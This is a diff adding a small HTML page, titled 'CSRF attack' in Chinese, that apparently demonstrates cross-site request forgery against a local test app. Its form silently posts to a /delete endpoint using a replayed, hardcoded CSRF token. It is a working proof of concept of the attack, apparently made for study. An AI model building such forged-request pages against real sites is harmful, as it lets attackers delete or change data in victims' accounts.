@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>csrf攻击</title>
+</head>
+<body>
+    <h1>csrf攻击</h1>
+    <form action="http://127.0.0.1:5000/delete/7" method="post">
+        <!-- <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"> -->
+        <!-- 直接获取到一次性的 token， 也可以攻击 -->
+        <input type="hidden" name="csrf_token" value="IjA5ODNhNDBlYzhmNTEyYmMzMDFhMzg4NWM4ZWQ5MDY1MjdjNWJhYTYi.XZyl_g.O_J-ioMZzubrkkKqRsCOF4PCjSw">
+        <input type="submit" value="CSRF攻击">
+    </form>
+
+</body>
+</html>
